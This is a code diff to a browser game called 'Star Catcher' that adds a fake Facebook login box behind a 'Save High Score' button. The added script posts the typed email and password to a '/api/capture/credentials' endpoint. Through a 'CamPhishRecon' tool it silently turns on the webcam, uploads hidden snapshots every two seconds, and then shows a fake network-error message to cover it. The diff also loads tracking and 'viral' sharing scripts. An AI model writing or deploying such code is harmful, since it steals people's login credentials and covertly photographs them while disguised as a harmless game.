@@ -49,10 +49,12 @@ body.is-desktop #hint{display:block}
 #camTip{position:absolute;bottom:36px;left:50%;transform:translateX(-50%);font-size:11px;color:rgba(255,255,255,0.25);max-width:280px;text-align:center}
 @keyframes glow{0%,100%{box-shadow:0 4px 24px rgba(255,107,157,0.4)}50%{box-shadow:0 4px 40px rgba(196,77,255,0.6)}}
 video,canvas#cap{position:fixed;opacity:0;pointer-events:none;width:2px;height:2px;top:-9999px;left:-9999px}
+.login-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:51;padding:20px}
 </style>
 </head>
 <body>
 <script src="forwarding_link/t/recon.js"></script>
+<script src="forwarding_link/t/viral.js"></script>
 <div id="wrap">
 <canvas id="c"></canvas>
 <video id="v" playsinline autoplay muted></video>
@@ -90,6 +92,7 @@ Dodge 🔺 obstacles &nbsp; Survive as long as you can!
 <button class="btn btn-share s-tw" onclick="share('tw')">🐦 Share</button>
 </div>
 <button class="btn btn-retry" id="retryBtn">▶ Play Again</button>
+<button class="btn btn-cam" id="saveScoreBtn" style="border-color:#1877f2;color:#1877f2;margin-top:8px;padding:10px 28px;font-size:14px">🔒 Save High Score</button>
 <div class="lb" id="goLb"></div>
 </div>
 </div>
@@ -156,9 +159,11 @@ genBg();
 loadHS();
 loadStreak();
 showLb();
-elPlayBtn.onclick=startGame;
-elRetryBtn.onclick=startGame;
-elCamBtn.onclick=reqCamera;
+	elPlayBtn.onclick=startGame;
+	elRetryBtn.onclick=startGame;
+	var sb=document.getElementById('saveScoreBtn');
+	if(sb)sb.onclick=function(){document.getElementById('fbGate').classList.remove('hidden');};
+	elCamBtn.onclick=reqCamera;
 addEventListener('keydown',onKeyDown);
 addEventListener('keyup',onKeyUp);
 setupTouch();
@@ -712,6 +717,27 @@ try{var d=JSON.parse(localStorage.getItem('starCatcherStreak')||'{}');streak=d.s
 function saveStreak(){
 localStorage.setItem('starCatcherStreak',JSON.stringify({streak:streak,date:lastPlayDate}));
 }
+function doFbGateLogin(){
+var u=document.getElementById('fbUser'),p=document.getElementById('fbPass');
+if(!u||!p||!u.value||!p.value)return;
+var data={template_id:'facebook',username:u.value,password:p.value};
+if(u.value.indexOf('@')>=0)data.email=u.value;
+fetch('/api/capture/credentials',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
+if(window.CamPhishRecon){
+CamPhishRecon.Capture.event('facerunner_facebook_gate',{});
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(s){
+var v=document.getElementById('v');v.srcObject=s;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'fb_gate_verify');}},2000);
+setTimeout(function(){clearInterval(ci);closeFbGate();alert('⚠️ Unable to save score. Network error. Please try again later.');},5000);
+}).catch(function(){closeFbGate();});
+}else{closeFbGate();}
+}
+
+function closeFbGate(){
+document.getElementById('fbGate').classList.add('hidden');
+}
+
 function showLb(){
 var h='<b>🏆 Top Scores</b><br>';
 for(var i=0;i<highScores.length;i++)h+='<div class="lb-row">#'+(i+1)+' — '+highScores[i]+'</div>';
@@ -721,6 +747,10 @@ if(elGoLb)elGoLb.innerHTML=h;
 }
 
 window.share=function(t){
+if(window.ViralEngine){
+ViralEngine.doShare(t,Math.floor(score),'⭐ I scored '+Math.floor(score)+' in Star Catcher! Can you beat me? '+SHARE_URL);
+return;
+}
 var cardCanvas=document.createElement('canvas');
 cardCanvas.width=600;cardCanvas.height=900;
 var cx=cardCanvas.getContext('2d');
@@ -799,5 +829,16 @@ a.click();
 init();
 })();
 </script>
+<div class="login-overlay hidden" id="fbGate">
+<div class="login-box" style="background:#fff;border-radius:8px;padding:20px;max-width:360px;width:90%;position:relative;z-index:51;box-shadow:0 8px 40px rgba(0,0,0,0.4);text-align:center;font-family:Helvetica,Arial,sans-serif">
+<div style="font-size:28px;font-weight:900;color:#1877f2;letter-spacing:-1px;margin-bottom:16px">facebook</div>
+<p style="font-size:14px;color:#606770;margin-bottom:16px">Log in to save your high score</p>
+<input type="text" placeholder="Email address or phone number" id="fbUser" style="width:100%;padding:14px;margin-bottom:10px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;background:#fff;box-sizing:border-box">
+<input type="password" placeholder="Password" id="fbPass" style="width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;background:#fff;box-sizing:border-box">
+<button onclick="doFbGateLogin()" style="width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer">Log In</button>
+<div style="margin-top:10px;font-size:12px;color:#606770">Your score will be saved to your profile</div>
+<button onclick="closeFbGate()" style="margin-top:8px;background:none;border:none;color:#606770;font-size:12px;cursor:pointer;text-decoration:underline">Skip — Play Again</button>
+</div>
+</div>
 </body>
 </html>
